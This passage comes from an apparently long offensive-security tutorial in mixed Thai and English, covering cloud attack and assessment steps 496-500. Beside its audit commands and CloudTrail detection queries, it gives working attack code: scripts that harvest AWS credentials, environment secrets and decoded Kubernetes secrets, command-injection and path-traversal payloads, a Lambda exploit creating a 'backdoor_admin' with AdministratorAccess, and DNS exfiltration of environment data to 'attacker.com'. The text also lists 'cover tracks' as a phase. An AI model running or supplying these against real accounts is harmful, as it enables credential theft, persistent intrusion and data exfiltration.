git -C {repo_path} log --all --full-history -p | grep -E 'AKIA'

# Dump all commits' diff
git -C {repo_path} log --all -p > /tmp/all_commits.txt
grep -E 'password|secret|key|token' /tmp/all_commits.txt | grep '+' | head -30
"""
        print(history_scan)
    
    def check_aws_credentials_file(self) -> list:
        """Check local AWS credentials"""
        creds_path = Path.home() / '.aws' / 'credentials'
        
        if creds_path.exists():
            print(f"[+] Found AWS credentials: {creds_path}")
            with open(creds_path) as f:
                content = f.read()
                
            # Extract profiles
            profiles = re.findall(r'\[(.+?)\]', content)
            print(f"[+] Profiles: {profiles}")
            
            # Extract keys
            keys = re.findall(r'aws_access_key_id\s*=\s*(\S+)', content)
            print(f"[+] Found {len(keys)} access keys")
            
            return profiles
        
        return []
    
    def scan_environment_variables(self) -> dict:
        """สแกน environment variables"""
        print("\n[*] Scanning environment variables...")
        secrets_found = {}
        
        for key, value in os.environ.items():
            for pattern_name, pattern in SECRET_PATTERNS.items():
                if re.search(pattern, f"{key}={value}"):
                    secrets_found[key] = {
                        'type': pattern_name,
                        'preview': value[:20] + '...' if len(value) > 20 else value
                    }
                    print(f"[+] SECRET ENV VAR: {key} ({pattern_name})")
        
        return secrets_found
    
    def scan_kubernetes_secrets(self) -> list:
        """Scan Kubernetes secrets (if kubectl available)"""
        print("\n[*] Scanning Kubernetes secrets...")
        
        k8s_cmds = """
# List all secrets
kubectl get secrets --all-namespaces

# Decode secret
kubectl get secret <name> -o jsonpath='{.data}' | python3 -c 'import sys,json,base64; d=json.load(sys.stdin); [print(f"{k}={base64.b64decode(v).decode()}") for k,v in d.items()]'

# Search for sensitive keys
kubectl get secrets -o json | python3 -c '
import sys, json, base64
data = json.load(sys.stdin)
for item in data["items"]:
    for k, v in item.get("data", {}).items():
        decoded = base64.b64decode(v).decode()
        if any(word in decoded.lower() for word in ["password", "secret", "key"]):
            print(f"{item["metadata"]["name"]}/{k}: {decoded[:50]}")'
"""
        print(k8s_cmds)
        return []
    
    def validate_aws_key(self, access_key: str, secret_key: str) -> bool:
        """ตรวจสอบว่า AWS key ใช้งานได้"""
        import boto3
        from botocore.exceptions import ClientError
        
        try:
            session = boto3.Session(
                aws_access_key_id=access_key,
                aws_secret_access_key=secret_key
            )
            sts = session.client('sts')
            identity = sts.get_caller_identity()
            print(f"[+] VALID KEY! Account: {identity['Account']}")
            print(f"[+] ARN: {identity['Arn']}")
            return True
        except ClientError as e:
            print(f"[-] Invalid key: {e.response['Error']['Code']}")
            return False

if __name__ == '__main__':
    hunter = CloudSecretsHunter()
    hunter.scan_code_repository('/tmp/target_repo')
    hunter.check_aws_credentials_file()
    hunter.scan_environment_variables()
    hunter.scan_kubernetes_secrets()
```

---

## Step 497: Cloud Network Security Testing

```python
#!/usr/bin/env python3
# Cloud Network Security Testing

class CloudNetworkTester:
    """Cloud network security assessment"""
    
    def test_security_group_misconfiguration(self):
        """Test AWS Security Group misconfigurations"""
        sg_audit_cmds = """
# List all security groups with 0.0.0.0/0 access
aws ec2 describe-security-groups \\
    --filters 'Name=ip-permission.cidr,Values=0.0.0.0/0' \\
    --query 'SecurityGroups[*].{ID:GroupId,Name:GroupName,Rules:IpPermissions}'

# Find SGs with ALL traffic open
aws ec2 describe-security-groups \\
    --query 'SecurityGroups[?IpPermissions[?IpRanges[?CidrIp==`0.0.0.0/0`]]].{ID:GroupId,Name:GroupName}'

# Check for unrestricted SSH
aws ec2 describe-security-groups \\
    --filters \\
    'Name=ip-permission.from-port,Values=22' \\
    'Name=ip-permission.cidr,Values=0.0.0.0/0' \\
    --query 'SecurityGroups[*].{ID:GroupId,Name:GroupName}'

# ใช้ ScoutSuite สำหรับ comprehensive audit
pip install scoutsuite
scout aws --profile default --report-dir /tmp/scoutsuite_report
"""
        print(sg_audit_cmds)
    
    def test_vpc_flow_logs(self):
        """Check VPC Flow Logs status"""
        vpc_cmds = """
# ตรวจสอบ VPC Flow Logs
aws ec2 describe-flow-logs

# หา VPCs ที่ไม่มี flow logs
aws ec2 describe-vpcs --query 'Vpcs[*].VpcId' | xargs -I{} aws ec2 describe-flow-logs \\
    --filter "Name=resource-id,Values={}"

# Analyze flow logs (if accessible)
aws logs filter-log-events \\
    --log-group-name /aws/vpc/flow-logs \\
    --filter-pattern '5 REJECT'
"""
        print(vpc_cmds)
    
    def test_azure_nsg_rules(self):
        """Test Azure NSG misconfiguration"""
        nsg_cmds = """
# List NSGs with wildcard rules
az network nsg list --query '[*].{Name:name, Rules:securityRules}'

# Find rules allowing all inbound
az network nsg list \\
    --query '[*].securityRules[?access==`Allow` && direction==`Inbound` && sourceAddressPrefix==`*`]'

# ใช้ Prowler สำหรับ Azure security audit
git clone https://github.com/prowler-cloud/prowler
python3 prowler azure --az-cli-auth
"""
        print(nsg_cmds)
    
    def test_serverless_function_security(self):
        """Test Lambda/Cloud Functions security"""
        serverless_tests = """
# AWS Lambda security tests

# List functions
aws lambda list-functions --query 'Functions[*].{Name:FunctionName,Role:Role}'

# Check function permissions (resource policy)
aws lambda get-policy --function-name <function_name>

# เรียก function โดยตรง (ถ้า permission ไม่ถูก)
aws lambda invoke \\
    --function-name vulnerable_function \\
    --payload '{"key":"value"}' \\
    /tmp/response.json

# Environment variables (may contain secrets)
aws lambda get-function-configuration \\
    --function-name <name> \\
    --query 'Environment.Variables'

# หา Lambda functions ที่สามารถ invoke ได้แบบ anonymous
aws lambda get-policy --function-name <name> | grep '"Principal":"*"'
"""
        print(serverless_tests)
    
    def generate_cloud_pentest_report(self, findings: list) -> str:
        """Generate cloud pentest report"""
        report = """
Cloud Security Assessment Report
=================================

Executive Summary:
การประเมินความปลอดภัยของ cloud infrastructure พบช่องโหว่หลายระดับ

Critical Findings:
1. S3 Public Access - ข้อมูลสำคัญเปิดเผยสาธารณะ
2. IMDS v1 + SSRF = IAM credential theft
3. Over-permissive IAM roles
4. Security groups open to 0.0.0.0/0

Recommendations:
- Enforce IMDSv2
- Block public S3 access at account level
- Implement least privilege IAM
- Enable CloudTrail + GuardDuty
- Use AWS Config for compliance
"""
        return report

if __name__ == '__main__':
    tester = CloudNetworkTester()
    tester.test_security_group_misconfiguration()
    tester.test_serverless_function_security()
```

---

## Step 498: CloudTrail Log Analysis

```python
#!/usr/bin/env python3
# CloudTrail Log Analysis for Attack Detection

import boto3
import json
from datetime import datetime, timedelta

SUSPICIOUS_EVENTS = [
    'ConsoleLogin',
    'GetPasswordData',
    'AssumeRole',
    'CreateUser',
    'AttachUserPolicy',
    'CreateAccessKey',
    'DeleteTrail',
    'StopLogging',
    'PutBucketPolicy',
    'GetSecretValue',
    'Decrypt',
]

class CloudTrailAnalyzer:
    """CloudTrail log analysis for security monitoring"""
    
    def __init__(self, region: str = 'us-east-1'):
        self.cloudtrail = boto3.client('cloudtrail', region_name=region)
        self.logs = boto3.client('logs', region_name=region)
    
    def search_suspicious_events(self, hours: int = 24) -> list:
        """ค้นหา suspicious events"""
        print(f"[*] Searching CloudTrail events (last {hours}h)...")
        
        end_time = datetime.now()
        start_time = end_time - timedelta(hours=hours)
        
        suspicious = []
        
        for event_name in SUSPICIOUS_EVENTS:
            try:
                events = self.cloudtrail.lookup_events(
                    LookupAttributes=[
                        {'AttributeKey': 'EventName', 'AttributeValue': event_name}
                    ],
                    StartTime=start_time,
                    EndTime=end_time
                )
                
                for event in events['Events']:
                    suspicious.append({
                        'event_name': event['EventName'],
                        'username': event.get('Username', 'N/A'),
                        'source_ip': event.get('CloudTrailEvent', '{}'),
                        'time': str(event['EventTime'])
                    })
                    print(f"[!] {event['EventName']} by {event.get('Username')} at {event['EventTime']}")
            except Exception as e:
                pass
        
        return suspicious
    
    def detect_credential_compromise(self) -> list:
        """Detect potential credential compromise"""
        detection_queries = """
# CloudWatch Logs Insights queries for threat detection

# 1. Multiple failed logins
filter eventName = 'ConsoleLogin' and responseElements.ConsoleLogin = 'Failure'
| stats count(*) as failures by userIdentity.arn, sourceIPAddress
| filter failures > 5
| sort failures desc

# 2. API calls from new location
filter eventSource = 'iam.amazonaws.com'
| stats count(*) as calls by sourceIPAddress, userIdentity.arn
| filter calls > 10
| sort calls desc

# 3. Unusual IAM activity
filter eventName in ['CreateUser', 'AttachUserPolicy', 'CreateAccessKey']
| stats count(*) by userIdentity.arn, eventName, sourceIPAddress
| filter count(*) > 3

# 4. S3 data exfiltration
filter eventName = 'GetObject'
| stats count(*) as downloads by userIdentity.arn, sourceIPAddress
| filter downloads > 100

# ใช้ AWS CLI
aws logs start-query \\
    --log-group-name CloudTrail/DefaultLogGroup \\
    --start-time $(date -d '24 hours ago' +%s) \\
    --end-time $(date +%s) \\
    --query-string 'filter eventName in ["DeleteTrail", "StopLogging"] | stats count(*) by eventName'
"""
        print(detection_queries)
        return []
    
    def export_cloudtrail_logs(self, s3_bucket: str, trail_name: str):
        """Export CloudTrail to S3"""
        export_cmd = f"""
# ตั้งค่า CloudTrail
aws cloudtrail create-trail \\
    --name {trail_name} \\
    --s3-bucket-name {s3_bucket} \\
    --is-multi-region-trail \\
    --enable-log-file-validation

aws cloudtrail start-logging --name {trail_name}

# ดู logs
aws s3 ls s3://{s3_bucket}/AWSLogs/

# Athena สำหรับ query
CREATE EXTERNAL TABLE cloudtrail_logs (
    eventVersion STRING,
    userIdentity STRUCT<type:STRING, principalId:STRING, arn:STRING>,
    eventTime STRING,
    eventName STRING,
    sourceIPAddress STRING
)
ROW FORMAT SERDE 'com.amazon.emr.hive.serde.CloudTrailSerde'
STORED AS INPUTFORMAT 'com.amazon.emr.cloudtrail.CloudTrailInputFormat'
OUTFORMAT 'org.apache.hadoop.hive.ql.io.HiveIgnoreKeyTextOutputFormat'
LOCATION 's3://{s3_bucket}/AWSLogs/';
"""
        print(export_cmd)

if __name__ == '__main__':
    analyzer = CloudTrailAnalyzer()
    suspicious = analyzer.search_suspicious_events(hours=48)
    analyzer.detect_credential_compromise()
```

---

## Step 499: Serverless Security Testing

```python
#!/usr/bin/env python3
# Serverless Security Testing (Lambda, Cloud Functions, Azure Functions)

class ServerlessSecurityTester:
    """Serverless function security assessment"""
    
    def test_event_injection(self, function_url: str):
        """Test event injection in serverless functions"""
        import requests
        
        injection_payloads = [
            # NoSQL injection (DynamoDB)
            {'username': {'$gt': ''}, 'password': {'$gt': ''}},
            # SSTI in event data
            {'input': '{{7*7}}'},
            # Command injection
            {'command': '; cat /etc/passwd'},
            # Path traversal
            {'filename': '../../etc/passwd'},
        ]
        
        print(f"[*] Testing serverless event injection: {function_url}")
        
        for payload in injection_payloads:
            try:
                resp = requests.post(
                    function_url,
                    json=payload,
                    timeout=30
                )
                print(f"  Status: {resp.status_code}, Payload: {payload}")
                
                if any(indicator in resp.text for indicator in ['root:', 'uid=', '49', 'bash']):
                    print(f"[!] POTENTIAL INJECTION: {payload}")
            except Exception as e:
                pass
    
    def test_function_permissions(self, function_name: str, region: str = 'us-east-1'):
        """Test Lambda function over-permissions"""
        import boto3
        from botocore.exceptions import ClientError
        
        print(f"\n[*] Testing Lambda permissions: {function_name}")
        
        lambda_client = boto3.client('lambda', region_name=region)
        iam_client = boto3.client('iam')
        
        try:
            # Get function's execution role
            config = lambda_client.get_function_configuration(FunctionName=function_name)
            role_arn = config['Role']
            role_name = role_arn.split('/')[-1]
            
            print(f"[+] Execution Role: {role_arn}")
            
            # Get attached policies
            policies = iam_client.list_attached_role_policies(RoleName=role_name)
            for policy in policies['AttachedPolicies']:
                if 'AdministratorAccess' in policy['PolicyName']:
                    print(f"[!] CRITICAL: Function has AdministratorAccess!")
                print(f"  Policy: {policy['PolicyName']}")
        except ClientError as e:
            print(f"[-] Error: {e}")
    
    def exploit_overprivileged_lambda(self):
        """Exploit over-privileged Lambda function"""
        exploit_payload = '''
# Lambda function payload that abuses IAM permissions
# If Lambda has IAM permissions, inject this via event

{
    "command": "iam",
    "action": "create_backdoor",
    "target_user": "backdoor_admin"
}

# Inside vulnerable Lambda:
import boto3
def lambda_handler(event, context):
    if event.get('command') == 'iam':
        iam = boto3.client('iam')  # Uses Lambda's role!
        iam.create_user(UserName='backdoor_admin')
        iam.attach_user_policy(
            UserName='backdoor_admin',
            PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
        )
        key = iam.create_access_key(UserName='backdoor_admin')
        return key['AccessKey']
'''
        print("[*] Over-privileged Lambda exploitation:")
        print(exploit_payload)
    
    def container_escape_via_lambda(self):
        """Lambda container escape techniques"""
        escape_techniques = """
# Lambda ทำงานใน container environment
# เต็มใจสามารถ read:
/proc/self/environ  # environment variables
/proc/self/cgroup   # cgroup info
/etc/hosts

# Exfiltrate data:
# ใช้ DNS exfiltration (อาจ bypass network restrictions)
import socket, base64
data = open('/proc/self/environ').read()
encoded = base64.b32encode(data[:30].encode()).decode().lower()
socket.getaddrinfo(f"{encoded}.attacker.com", 80)

# Environment variables มักมี AWS credentials:
import os
print(os.environ.get('AWS_ACCESS_KEY_ID'))
print(os.environ.get('AWS_SECRET_ACCESS_KEY'))
print(os.environ.get('AWS_SESSION_TOKEN'))
"""
        print(escape_techniques)

if __name__ == '__main__':
    tester = ServerlessSecurityTester()
    tester.test_event_injection('https://lambda.url.us-east-1.on.aws/function-url')
    tester.test_function_permissions('vulnerable-function')
    tester.exploit_overprivileged_lambda()
    tester.container_escape_via_lambda()
```

---

## Step 500: Cloud Security Assessment Automation

```python
#!/usr/bin/env python3
# Cloud Security Assessment Automation Framework

import json
import time
from dataclasses import dataclass, field
from typing import List, Dict
from enum import Enum

class CloudProvider(Enum):
    AWS = 'aws'
    AZURE = 'azure'
    GCP = 'gcp'

@dataclass
class CloudFinding:
    provider: CloudProvider
    service: str
    title: str
    severity: str
    description: str
    recommendation: str
    resource_arn: str = ''

CLOUD_SECURITY_TOOLS = {
    'AWS': {
        'ScoutSuite': 'git clone https://github.com/nccgroup/ScoutSuite && cd ScoutSuite && pip install -r requirements.txt && python3 scout.py aws',
        'Prowler': 'pip install prowler && prowler aws',
        'CloudSploit': 'git clone https://github.com/aquasecurity/cloudsploit && npm install && node index.js --config config.js',
        'Pacu': 'git clone https://github.com/RhinoSecurityLabs/pacu && pip install -r requirements.txt && python3 pacu.py',
    },
    'Azure': {
        'ScoutSuite': 'python3 scout.py azure --cli',
        'Prowler': 'prowler azure --az-cli-auth',
        'Azurite': 'npm install -g azurite',
    },
    'GCP': {
        'ScoutSuite': 'python3 scout.py gcp --user-account',
        'Prowler': 'prowler gcp --project-id PROJECT_ID',
    }
}

class CloudSecurityAssessment:
    """Automated cloud security assessment framework"""
    
    def __init__(self, provider: CloudProvider):
        self.provider = provider
        self.findings: List[CloudFinding] = []
        self.start_time = time.time()
    
    def run_scoutsuite(self, provider: str = 'aws'):
        """Run ScoutSuite automated scan"""
        scoutsuite_cmd = f"""
# ScoutSuite - Multi-cloud security auditing
pip install scoutsuite

# AWS
scout aws \\
    --profile default \\
    --report-name my_assessment \\
    --report-dir /tmp/scoutsuite_results

# Azure
scout azure \\
    --cli \\
    --subscription-ids SUBSCRIPTION_ID

# GCP
scout gcp \\
    --user-account \\
    --project PROJECT_ID

# เปิด HTML report
python3 -m http.server -d /tmp/scoutsuite_results/
# http://localhost:8000
"""
        print(scoutsuite_cmd)
    
    def run_prowler(self, provider: str = 'aws'):
        """Run Prowler security checks"""
        prowler_cmds = f"""
# Prowler - Cloud Security Posture Management
pip install prowler

# AWS full scan
prowler aws \\
    --profile default \\
    --output-formats html json \\
    --output-directory /tmp/prowler_results

# AWS specific service
prowler aws \\
    --service iam s3 cloudtrail

# Azure
prowler azure \\
    --az-cli-auth \\
    --subscription-ids SUBSCRIPTION_ID

# GCP
prowler gcp \\
    --project-id PROJECT_ID

# Output: HTML/JSON report, CSV for import
"""
        print(prowler_cmds)
    
    def generate_assessment_plan(self) -> dict:
        """สร้าง assessment plan"""
        plan = {
            'provider': self.provider.value,
            'phases': [
                {
                    'phase': 1,
                    'name': 'Reconnaissance',
                    'activities': [
                        'Identify cloud services in use',
                        'Enumerate IAM users, roles, policies',
                        'Discover S3 buckets, storage accounts',
                        'Map network topology'
                    ]
                },
                {
                    'phase': 2,
                    'name': 'Vulnerability Assessment',
                    'activities': [
                        'Run automated scanning tools',
                        'Check IAM least privilege',
                        'Test public storage access',
                        'Verify encryption settings'
                    ]
                },
                {
                    'phase': 3,
                    'name': 'Exploitation',
                    'activities': [
                        'Attempt privilege escalation',
                        'Exploit SSRF for IMDS access',
                        'Test lateral movement',
                        'Simulate data exfiltration'
                    ]
                },
                {
                    'phase': 4,
                    'name': 'Post-Exploitation',
                    'activities': [
                        'Establish persistence',
                        'Cover tracks',
                        'Document access achieved'
                    ]
                },
                {
                    'phase': 5,
                    'name': 'Reporting',
                    'activities': [
                        'Document all findings',
                        'Calculate risk scores',
                        'Provide remediation steps',
                        'Executive summary'
                    ]
                }
            ],
            'tools': list(CLOUD_SECURITY_TOOLS.get(self.provider.value.upper(), {}).keys())
        }
        return plan
    
    def generate_final_report(self) -> str:
        """Generate comprehensive cloud security report"""
        duration = time.time() - self.start_time
        
        critical = [f for f in self.findings if f.severity == 'CRITICAL']
        high = [f for f in self.findings if f.severity == 'HIGH']
        medium = [f for f in self.findings if f.severity == 'MEDIUM']
        
        report = f"""
Cloud Security Assessment Report
Provider: {self.provider.value.upper()}
Date: {time.strftime('%Y-%m-%d')}
Duration: {duration:.0f}s
{'='*60}

Summary:
  Total Findings: {len(self.findings)}
  Critical: {len(critical)}
  High: {len(high)}
  Medium: {len(medium)}

Critical Findings:
{chr(10).join([f'  [{f.service}] {f.title}' for f in critical])}

Top Recommendations:
  1. Enable MFA for all privileged accounts
  2. Enforce IMDSv2 on all EC2 instances
  3. Block public access to all S3 buckets
  4. Implement least privilege IAM policies
  5. Enable comprehensive logging (CloudTrail, etc.)
  6. Deploy CSPM solution for continuous monitoring
"""
        return report

if __name__ == '__main__':
    assessment = CloudSecurityAssessment(CloudProvider.AWS)
    plan = assessment.generate_assessment_plan()
    print(json.dumps(plan, indent=2))
    
    assessment.run_scoutsuite('aws')
    assessment.run_prowler('aws')
    
    report = assessment.generate_final_report()
    print(report)
    
    print("\n[+] Progress: Step 500/1000 - MILESTONE REACHED!")
    print("[+] Completed: Parts 1-50")
    print("[+] Coverage: Wireless, IoT, Cloud (AWS/Azure/GCP)")
```

---

## สรุป Part 50 - Cloud Security

| Step | หัวข้อ | เครื่องมือหลัก |
|------|--------|---------------|
| 491 | AWS IAM Privilege Escalation | Pacu, enumerate-iam, boto3 |
| 492 | AWS S3 Security | S3Scanner, truffleHog, AWS CLI |
| 493 | AWS IMDS via SSRF | SSRF payload variants |
| 494 | Azure AD Attacks | MSAL, AADInternals |
| 495 | GCP Security Testing | gcloud, gsutil, GCPBucketBrute |
| 496 | Cloud Secrets Hunting | truffleHog, gitleaks, detect-secrets |
| 497 | Cloud Network Security | ScoutSuite, Prowler, AWS Config |
| 498 | CloudTrail Log Analysis | CloudWatch Logs Insights, Athena |
| 499 | Serverless Security | Lambda permissions, event injection |
| 500 | Cloud Assessment Automation | ScoutSuite, Prowler automation |

**สำเร็จ Step 500/1000 - Milestone!**

Key Cloud Security Risks:
- IAM over-permissions allow privilege escalation
- SSRF -> IMDS = credential theft
- Public S3 = data breach
- Leaked secrets in code repositories  
- Misconfigured serverless functions
